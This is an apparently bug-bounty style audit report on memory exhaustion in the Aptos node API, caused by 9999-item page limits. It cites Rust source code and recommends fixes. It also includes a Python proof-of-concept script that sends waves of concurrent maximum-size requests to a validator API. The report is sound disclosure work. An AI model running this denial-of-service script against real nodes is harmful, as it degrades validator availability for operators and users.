# Audit Report

## Title
API Memory Exhaustion via Concurrent Paginated Requests with Maximum Page Sizes

## Summary
The Aptos API allows concurrent paginated requests with extremely high page size limits (9999 for account resources and modules), enabling attackers to exhaust validator node memory and cause crashes or severe performance degradation through sustained concurrent requests.

## Finding Description

The API configuration defines disproportionate pagination limits that create a memory exhaustion vulnerability. While transaction and event APIs are limited to 100 items per page, account resource and module APIs allow up to 9999 items per page. [1](#0-0) 

The tokio runtime limits concurrent blocking tasks to 64 threads: [2](#0-1) 

All paginated API handlers use `api_spawn_blocking()`, which wraps `tokio::task::spawn_blocking()`: [3](#0-2) 

The `get_resources_by_pagination()` function loads all requested resources into memory before returning: [4](#0-3) 

Resource groups are then expanded, potentially multiplying the number of items: [5](#0-4) 

**Attack Path:**
1. Attacker sends 64 concurrent HTTP requests to `/accounts/:address/resources?limit=9999`
2. Each request targets accounts with substantial resources (system accounts, popular dApps, or multiple different accounts)
3. Each request loads up to 9999 resources into memory as `Vec<(StructTag, Vec<u8>)>`
4. Total memory footprint: 64 requests × 9999 resources × (resource size)
5. With average resource size of 10KB: ~6.4 GB per attack wave
6. Multiple concurrent attackers or sustained attacks can exceed available memory
7. Node experiences memory pressure, swapping, and eventual OOM crash

The resources API endpoint confirms this behavior: [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria:
- **Validator node slowdowns**: Memory exhaustion causes significant performance degradation
- **API crashes**: Out-of-memory conditions can crash the API service or entire validator node

The attack affects validator availability, which is critical for network operation. Unlike the faucet API which implements concurrent request limiting via Semaphore, the main API lacks such protection. The 99x difference between resource pagination limits (9999) and transaction pagination limits (100) creates an exploitable asymmetry.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- Requires only HTTP client capable of concurrent requests
- No authentication or special permissions needed
- No need for validator insider access
- Publicly exposed API endpoints on validator nodes

While the `MAX_BLOCKING_THREADS=64` limit provides some protection, it's insufficient:
- 64 concurrent requests with 9999 items each = 639,936 total items in memory
- Multiple attackers can compound the effect
- Accounts with thousands of resources exist (system accounts, major dApps)
- Modules can be very large (100KB+ of bytecode)

The lack of application-level rate limiting (unlike the faucet implementation) makes sustained attacks feasible.

## Recommendation

Implement multi-layered protection against memory exhaustion:

**1. Reduce excessive pagination limits:**
```rust
// In config/src/config/api_config.rs
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 100; // Reduced from 9999
const DEFAULT_MAX_ACCOUNT_MODULES_PAGE_SIZE: u16 = 100;   // Reduced from 9999
```

**2. Add global concurrent request limiting** (similar to faucet API):
```rust
// In api/src/runtime.rs
use tokio::sync::Semaphore;

pub struct Context {
    // ... existing fields ...
    pub api_request_semaphore: Arc<Semaphore>,
}

// Initialize with reasonable limit
let api_request_semaphore = Arc::new(Semaphore::new(100)); // Max 100 concurrent API requests
```

**3. Implement per-IP rate limiting:**
```rust
// Add to ApiConfig
pub max_requests_per_ip_per_minute: usize, // e.g., 60
```

**4. Add memory-aware backpressure:**
- Monitor current memory usage
- Reject new paginated requests when memory pressure exceeds threshold
- Return HTTP 503 (Service Unavailable) with appropriate retry headers

**5. Stream results** instead of loading all into memory at once for large result sets.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
API Memory Exhaustion PoC
Demonstrates concurrent paginated requests causing memory exhaustion
"""

import requests
import concurrent.futures
import time

VALIDATOR_API_URL = "http://localhost:8080"  # Adjust to target validator
CONCURRENT_REQUESTS = 64  # Match MAX_BLOCKING_THREADS
PAGE_SIZE = 9999  # Maximum allowed

# Target accounts (system accounts typically have many resources)
TARGET_ACCOUNTS = [
    "0x1",  # Framework account
    "0xa550c18",  # Aptos core resources
    # Add more accounts or rotate through different addresses
]

def fetch_resources(account_address):
    """Fetch maximum resources for an account"""
    url = f"{VALIDATOR_API_URL}/v1/accounts/{account_address}/resources"
    params = {"limit": PAGE_SIZE}
    
    start_time = time.time()
    try:
        response = requests.get(url, params=params, timeout=60)
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            resources = response.json()
            print(f"[+] Fetched {len(resources)} resources from {account_address} in {elapsed:.2f}s")
            return len(resources)
        else:
            print(f"[-] Request failed: {response.status_code}")
            return 0
    except Exception as e:
        print(f"[-] Exception: {e}")
        return 0

def main():
    print(f"[*] Starting memory exhaustion attack")
    print(f"[*] Concurrent requests: {CONCURRENT_REQUESTS}")
    print(f"[*] Page size per request: {PAGE_SIZE}")
    print(f"[*] Total items requested: {CONCURRENT_REQUESTS * PAGE_SIZE}")
    
    # Launch concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        # Rotate through target accounts
        accounts = [TARGET_ACCOUNTS[i % len(TARGET_ACCOUNTS)] for i in range(CONCURRENT_REQUESTS)]
        
        futures = [executor.submit(fetch_resources, account) for account in accounts]
        
        total_resources = sum(future.result() for future in concurrent.futures.as_completed(futures))
        
    print(f"\n[*] Attack complete. Total resources loaded: {total_resources}")
    print(f"[*] Estimated memory usage: ~{total_resources * 10 / 1024 / 1024:.2f} GB (assuming 10KB per resource)")
    print(f"\n[!] Repeat this attack in waves to sustain memory pressure")

if __name__ == "__main__":
    main()
```

**Expected Behavior:**
- Validator node memory usage spikes significantly
- Response times increase dramatically
- Under sustained attack: OOM killer terminates validator process or node becomes unresponsive
- Network availability degraded as validator fails to participate in consensus

## Notes

The vulnerability exists because:
1. Account resource pagination limits (9999) are 99x higher than transaction limits (100)
2. No application-level concurrent request limiting exists for the main API
3. All data is loaded into memory before processing
4. Resource groups can expand items beyond the requested limit
5. The `MAX_BLOCKING_THREADS=64` protection is insufficient against this memory multiplication attack

This breaks the critical invariant: **"Resource Limits: All operations must respect gas, storage, and computational limits"** by allowing unbounded memory consumption through legitimate API usage patterns.

### Citations

**File:** config/src/config/api_config.rs (L99-101)
```rust
pub const DEFAULT_MAX_PAGE_SIZE: u16 = 100;
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
const DEFAULT_MAX_ACCOUNT_MODULES_PAGE_SIZE: u16 = 9999;
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** api/src/context.rs (L470-529)
```rust
    pub fn get_resources_by_pagination(
        &self,
        address: AccountAddress,
        prev_state_key: Option<&StateKey>,
        version: u64,
        limit: u64,
    ) -> Result<(Vec<(StructTag, Vec<u8>)>, Option<StateKey>)> {
        let account_iter = if !db_sharding_enabled(&self.node_config) {
            Box::new(
                self.db
                    .get_prefixed_state_value_iterator(
                        &StateKeyPrefix::from(address),
                        prev_state_key,
                        version,
                    )?
                    .map(|item| item.map_err(|err| anyhow!(err.to_string()))),
            )
        } else {
            self.indexer_reader
                .as_ref()
                .ok_or_else(|| format_err!("Indexer reader doesn't exist"))?
                .get_prefixed_state_value_iterator(
                    &StateKeyPrefix::from(address),
                    prev_state_key,
                    version,
                )?
        };
        // TODO: Consider rewriting this to consider resource groups:
        // * If a resource group is found, expand
        // * Return Option<Result<(PathType, StructTag, Vec<u8>)>>
        // * Count resources and only include a resource group if it can completely fit
        // * Get next_key as the first struct_tag not included
        let mut resource_iter = account_iter
            .filter_map(|res| match res {
                Ok((k, v)) => match k.inner() {
                    StateKeyInner::AccessPath(AccessPath { address: _, path }) => {
                        match Path::try_from(path.as_slice()) {
                            Ok(Path::Resource(struct_tag)) => {
                                Some(Ok((struct_tag, v.bytes().to_vec())))
                            }
                            // TODO: Consider expanding to Path::Resource
                            Ok(Path::ResourceGroup(struct_tag)) => {
                                Some(Ok((struct_tag, v.bytes().to_vec())))
                            }
                            Ok(Path::Code(_)) => None,
                            Err(e) => Some(Err(anyhow::Error::from(e))),
                        }
                    }
                    _ => {
                        error!("storage prefix scan return inconsistent key ({:?}) with expected key prefix ({:?}).", k, StateKeyPrefix::from(address));
                        Some(Err(format_err!( "storage prefix scan return inconsistent key ({:?})", k )))
                    }
                },
                Err(e) => Some(Err(e)),
            })
            .take(limit as usize + 1);
        let kvs = resource_iter
            .by_ref()
            .take(limit as usize)
            .collect::<Result<Vec<(StructTag, Vec<u8>)>>>()?;
```

**File:** api/src/context.rs (L536-551)
```rust
        let kvs = kvs
            .into_iter()
            .map(|(tag, value)| {
                if converter.is_resource_group(&tag) {
                    // An error here means a storage invariant has been violated
                    bcs::from_bytes::<ResourceGroup>(&value)
                        .map(|map| map.into_iter().collect::<Vec<_>>())
                        .map_err(|e| e.into())
                } else {
                    Ok(vec![(tag, value)])
                }
            })
            .collect::<Result<Vec<Vec<(StructTag, Vec<u8>)>>>>()?
            .into_iter()
            .flatten()
            .collect();
```

**File:** api/src/context.rs (L1645-1654)
```rust
pub async fn api_spawn_blocking<F, T, E>(func: F) -> Result<T, E>
where
    F: FnOnce() -> Result<T, E> + Send + 'static,
    T: Send + 'static,
    E: InternalError + Send + 'static,
{
    tokio::task::spawn_blocking(func)
        .await
        .map_err(|err| E::internal_with_code_no_info(err, AptosErrorCode::InternalError))?
}
```

**File:** api/src/accounts.rs (L448-471)
```rust
    pub fn resources(self, accept_type: &AcceptType) -> BasicResultWith404<Vec<MoveResource>> {
        let max_account_resources_page_size = self.context.max_account_resources_page_size();
        let (resources, next_state_key) = self
            .context
            .get_resources_by_pagination(
                self.address.into(),
                self.start.as_ref(),
                self.ledger_version,
                // Just use the max as the default
                determine_limit(
                    self.limit,
                    max_account_resources_page_size,
                    max_account_resources_page_size,
                    &self.latest_ledger_info,
                )? as u64,
            )
            .context("Failed to get resources from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &self.latest_ledger_info,
                )
            })?;
```
